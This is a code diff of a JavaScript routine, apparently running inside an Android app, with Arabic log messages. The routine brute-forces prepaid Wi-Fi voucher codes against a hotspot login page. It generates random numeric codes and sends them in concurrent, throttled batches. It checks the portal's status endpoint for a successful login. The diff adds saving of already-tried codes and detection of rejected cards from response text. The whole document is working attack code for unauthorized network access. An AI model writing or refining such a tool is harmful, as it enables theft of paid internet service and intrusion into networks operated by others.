@@ -65,7 +65,9 @@
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين (نمط بايثون الآمن)');
+            log('▶ بدء التخمين (مع حفظ التقدم)');
+            const tried = new Set(CFG.tried || []);
+            log('  تم تجربة ' + tried.size + ' رقم سابقاً في هذه الشبكة');
             
             const init = await safeJson(statusUrl);
             if (init && isActive(init)) {
@@ -93,7 +95,11 @@
             } catch(e) { }
 
             const maxVal = Math.pow(10, CFG.digits) - 1;
-            const tried = new Set();
+            if (tried.size > maxVal) {
+                log('⚠ تم استنفاد جميع الأرقام الممكنة لهذه الشبكة!');
+                return;
+            }
+
             const beforeUp = init ? uptimeSec(init.uptime) : -1;
             const beforeActive = isActive(init);
             
@@ -107,15 +113,15 @@
             const BATCH_REST = 5000;
             const RETRY_DELAY = CFG.retryDelay || 1000;
 
-            log('  التوازي = ' + MAX_CONCURRENT);
-            log('  التأخير = ' + DELAY_MIN + 'ms إلى ' + DELAY_MAX + 'ms');
-            log('  حجم الدفعة = ' + BATCH_SIZE + ' (ثم استراحة 5 ثواني)');
-
             function gen() {
-                for (let k = 0; k < 500; k++) {
+                for (let k = 0; k < 1000; k++) {
                     const num = Math.floor(Math.random() * (maxVal + 1));
                     const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
-                    if (!tried.has(v)) { tried.add(v); return v; }
+                    if (!tried.has(v)) { 
+                        tried.add(v); 
+                        window.AndroidBridge.saveTried(v);
+                        return v; 
+                    }
                 }
                 return null;
             }
@@ -141,16 +147,33 @@
                         signal: controller.signal
                     });
                     clearTimeout(timeoutId);
-                    return { v, code: r.status };
+                    
+                    let isBad = false;
+                    const loc = r.headers.get('Location') || '';
+                    let text = '';
+                    
+                    if (r.status !== 302 && r.status !== 301) {
+                        text = await r.text();
+                    }
+                    
+                    // قراءة الرد لمعرفة إذا كان الكرت خاطئ
+                    const combined = (loc + ' ' + text).toLowerCase();
+                    if (combined.includes('error') || combined.includes('fail') || 
+                        combined.includes('invalid') || combined.includes('denied') || 
+                        combined.includes('wrong') || combined.includes('incorrect')) {
+                        isBad = true;
+                    }
+                    
+                    return { v, code: r.status, isBad };
                 } catch(e) {
                     clearTimeout(timeoutId);
-                    return { v, code: 0 };
+                    return { v, code: 0, isBad: true };
                 }
             }
 
             while (done < CFG.attempts && !stopped) {
                 if (done > 0 && done % BATCH_SIZE === 0 && batchCount > 0) {
-                    log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني (BATCH_REST)...');
+                    log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني...');
                     await sleep(BATCH_REST);
                     batchCount = 0;
                 }
@@ -167,7 +190,10 @@
                     try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
                     batch.push(post(v));
                 }
-                if (batch.length === 0) break;
+                if (batch.length === 0) {
+                    log('⚠ لا توجد أرقام جديدة متبقية.');
+                    break;
+                }
                 
                 batchCount += batch.length;
                 const results = await Promise.all(batch);
@@ -178,7 +204,7 @@
                     await sleep(RETRY_DELAY);
                 }
 
-                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503);
+                const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503 && !r.isBad);
                 if (needCheck) {
                     await sleep(200);
                     const st = await safeJson(statusUrl);
@@ -199,7 +225,7 @@
                     }
                 }
             }
-            log('❌ انتهى — ' + done + ' محاولة');
+            log('❌ انتهى — ' + done + ' محاولة جديدة');
         } catch(e) {
             log('❌ خطأ: ' + e.message);
         }
